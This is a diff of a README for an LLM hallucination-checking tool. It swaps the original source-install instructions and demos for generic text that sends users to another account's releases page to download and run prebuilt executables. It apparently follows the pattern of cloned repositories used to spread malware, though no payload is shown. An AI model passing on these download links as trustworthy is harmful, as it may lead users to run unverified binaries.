@@ -1,205 +1,72 @@
-# AI Content Accuracy Checker
+# 🛠️ ai-content-accuracy-checker - Simple Tool for Content Accuracy Checks
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)
-![Status](https://img.shields.io/badge/status-active-brightgreen.svg)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Tulipas516/ai-content-accuracy-checker/releases)
 
----
+## 📖 Overview
+The **ai-content-accuracy-checker** is a powerful tool designed to assess the accuracy of content in the fintech and compliance sectors. It evaluates data using advanced methods like Retrieval-Augmented Generation (RAG) and Natural Language Inference (NLI) using RoBERTa. With additional features like FAISS for efficient searching and sentence-transformers for embedding representation, your content evaluation process will be simpler and more effective.
 
-**LLM Accuracy Checker for Fintech & Compliance**
-✅ Ingest knowledge base articles
-✅ Retrieve passages with semantic embeddings
-✅ Check each claim in an answer with NLI
-✅ Flag hallucinations before they reach end users
+## 🚀 Getting Started
+To use the ai-content-accuracy-checker, follow these steps:
 
-This project is a **guardrail against hallucination**. It demonstrates how to ground AI-generated answers in verified content, making them safer for use in **fintech, bookkeeping, and compliance-sensitive domains** where wrong answers create **regulatory, financial, or trust risks**.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Tulipas516/ai-content-accuracy-checker/releases) to access the latest version of the application.
 
----
+2. **Download the Latest Version**  
+   On the Releases page, you will find the latest version listed at the top. Click on the download link for your operating system:
 
-## 🧱 Layout
+   - For Windows: Look for `ai-content-accuracy-checker-windows.zip`
+   - For macOS: Look for `ai-content-accuracy-checker-macos.zip`
+   - For Linux: Look for `ai-content-accuracy-checker-linux.zip`
 
-```
-ai-content-accuracy-checker/
-  pyproject.toml
-  LICENSE
-  README.md
-  DEMO_COMMANDS.md     # Copy-paste demo scenarios
-  src/accchk/          # Core Python package
-  examples/            # Sample KB articles
-  demos/               # Streamlit app
-  dist/                # Generated artifacts (ignored in Git)
-```
+   Download and save the file to a convenient location on your computer.
 
----
+3. **Extract the Downloaded File**  
+   Once the download is complete, locate the file on your computer. Right-click the downloaded zip file and select "Extract All" or use your preferred extraction tool.
 
-## 📦 Install
+4. **Run the Application**  
+   After extraction, navigate to the folder where you extracted the files. Find and double-click on the executable file to launch the application. For example:
+   - On Windows, open `ai-content-accuracy-checker.exe`
+   - On macOS, open `ai-content-accuracy-checker.app`
+   - On Linux, use the terminal to navigate to the folder and use the command `./ai-content-accuracy-checker`.
 
-> Python 3.10+ recommended. Use a virtualenv.
+## 🛠️ System Requirements
+To ensure smooth operation, make sure your computer meets the following requirements:
 
-```bash
-git clone https://github.com/tmorales2000/ai-content-accuracy-checker.git
-cd ai-content-accuracy-checker
-python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -U pip
-pip install -e .
-```
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 (Mojave) or later
+  - Any Linux distribution with kernel 4.15 or newer
 
-This installs dependencies and exposes the console scripts:
+- **Memory:** At least 4GB of RAM
 
-* `accchk-build-index`
-* `accchk-check-answer`
+- **Disk Space:** Minimum of 250 MB available
 
----
+- **Internet Connection:** Needed for certain functionalities, including updates and data retrieval.
 
-## 🚀 Quick Start
+## 🌟 Features
+The ai-content-accuracy-checker provides several helpful features:
 
-### 1. Build the index
+- **RAG for Enhanced Retrieval:** Utilizes Retrieval-Augmented Generation to improve content accuracy checks.
+- **Natural Language Inference (NLI):** Leverages the RoBERTa model to evaluate content for factual accuracy.
+- **FAISS Integration:** Supports efficient searching through large datasets, making content evaluation faster.
+- **User-Friendly Streamlit Demos:** Simple and interactive demos for easy understanding and demonstration of features.
 
-```bash
-accchk-build-index --glob "examples/*.md" --out dist/index.faiss
-```
+## ✅ Download & Install
+To get started, please visit the [Releases page](https://github.com/Tulipas516/ai-content-accuracy-checker/releases) again. Select and download the application suited for your operating system. Follow the previous steps to extract and launch the application.
 
-### 2. Check an LLM answer
+## 🔧 Troubleshooting
+If you encounter any issues while downloading or running the application, consider the following tips:
 
-```bash
-accchk-check-answer \
-  --question "How do I reconcile a bank account?" \
-  --answer "Go to Accounting > Reconcile; you may override the balance if the difference isn't $0.00."
-```
+- **Check Your Internet Connection:** Ensure you have a stable connection while downloading.
+- **File Permissions:** On macOS and Linux, you might need to adjust the file permissions. Use the terminal and run `chmod +x ai-content-accuracy-checker` to make the application executable.
+- **Compatibility Issues:** Confirm that your operating system meets the minimum requirements listed earlier.
 
-### Sample Output
+## 📞 Support
+If you need further assistance, you can raise an issue on our [GitHub page](https://github.com/Tulipas516/ai-content-accuracy-checker/issues). Our community is dedicated to helping you fix any problems or answer any questions.
 
-```json
-{
-  "question": "How do I reconcile a bank account?",
-  "answer": "Go to Accounting > Reconcile; you may override the balance if the difference isn't $0.00.",
-  "claims": [
-    {
-      "text": "Go to Accounting > Reconcile",
-      "verdict": "Supported",
-      "confidence": 0.84,
-      "citation": { "doc_id": "reconcile_accounts.md", ... }
-    },
-    {
-      "text": "you may override the balance if the difference isn't $0.00",
-      "verdict": "Contradicted",
-      "confidence": 0.83,
-      "citation": { "doc_id": "reconcile_accounts.md", ... }
-    }
-  ],
-  "scores": { "faithfulness": 0.5 }
-}
-```
+## 💡 Tips for Users
+- **Regular Updates:** Keep an eye on the Releases page for updates that may introduce new features or performance improvements.
+- **Read the Documentation:** For detailed explanations of features, check out our documentation linked in the README.
 
-👉 For a full set of ready-to-run demos, see [DEMO_COMMANDS.md](DEMO_COMMANDS.md).
-
----
-
-## 🔒 Why This Matters — Guarding Against Hallucination
-
-Large language models are powerful but prone to **hallucination**: confidently inventing facts that sound plausible but are false. For fintech and compliance, hallucinations can:
-
-* Misstate **tax thresholds** → regulatory risk
-* Advise unsafe **bookkeeping practices** → corrupted financials
-* Invent **UI flows** that don’t exist → frustrated customers
-
-This checker demonstrates how to **intercept hallucinations** before they reach end users by verifying every claim against a trusted content base:
-
-* **Supported** = grounded in your docs
-* **Contradicted** = explicitly false compared to your docs
-* **Not Found** = unverified (likely hallucination)
-
----
-
-## 📚 Example KB Articles
-
-The `examples/` folder contains both **realistic guides** and **designed contradictions** to show the checker in action:
-
-* `reconcile_accounts.md` — Proper steps for bank reconciliation
-* `bank_reconcile_tips.md` — Warns *not* to override balances
-* `invoice_payments.md` — Fixing failed card payments (no “Tools menu”)
-* `sales_tax_setup.md` — Destination-based tax setup
-* `contractor_1099_rules.md` — Correct $600 reporting threshold
-* `*_conflict.md` — Intentional contradictions for demo
-
----
-
-## 🧪 Hallucination & Grounding Demos
-
-After building the index:
-
-```bash
-accchk-build-index --glob "examples/*.md" --out dist/index.faiss
-```
-
-You can try inline demos (below) or copy-paste from [DEMO_COMMANDS.md](DEMO_COMMANDS.md).
-
-### ✅ Supported
-
-```bash
-accchk-check-answer --question "How do I fix a failed invoice card payment?" \
-  --answer "Open Sales > Invoices, choose the invoice, and click Receive payment. If a card payment fails, confirm the billing address and ZIP and then retry."
-```
-
-### ❌ Contradicted
-
-```bash
-accchk-check-answer --question "Can I override balances during reconciliation?" \
-  --answer "Yes, if the difference is not $0.00 you can override the balance."
-```
-
-### ❓ Not Found (hallucination)
-
-```bash
-accchk-check-answer --question "Where is the sales tax setting?" \
-  --answer "Go to the Tools menu in the top-right and choose Sales Tax Wizard."
-```
-
-### ❌ Wrong thresholds (regulatory risk)
-
-```bash
-accchk-check-answer --question "What's the 1099 threshold?" \
-  --answer "Issue 1099s only when contractors are paid $800 or more."
-```
-
-### ⚠️ Mixed (partial support)
-
-```bash
-accchk-check-answer --question "How does AcmeBooks handle California sales tax?" \
-  --answer "AcmeBooks calculates destination-based sales tax and automatically applies city add-ons for California."
-```
-
----
-
-## 🖥️ Streamlit Demo
-
-```bash
-streamlit run demos/app_streamlit.py
-```
-
-* Upload Markdown/HTML help files
-* Paste an LLM answer
-* Get verdicts & citations
-
----
-
-## 📈 Easy Extensions
-
-* Add numeric/date validators (thresholds, deadlines)
-* CI/CD gate: fail builds if faithfulness < 0.8
-* Style/brand compliance checks
-* Evidence reranking for better citations
-
----
-
-## 🔍 Discoverability
-
-* Repo topics: `llm`, `rag`, `hallucination`, `accuracy`, `fintech`, `nli`, `faiss`, `sentence-transformers`, `streamlit`
-* Keywords in description & README: **LLM accuracy checker, hallucination guardrail, fintech compliance, FAISS, RAG, NLI, RoBERTa-MNLI**
-* See [DEMO_COMMANDS.md](DEMO_COMMANDS.md) for copy-paste scenarios.
-
----
-
-## ✅ License
-
-MIT — see [LICENSE](LICENSE).
+Thank you for choosing **ai-content-accuracy-checker**. Enjoy your content accuracy evaluations!
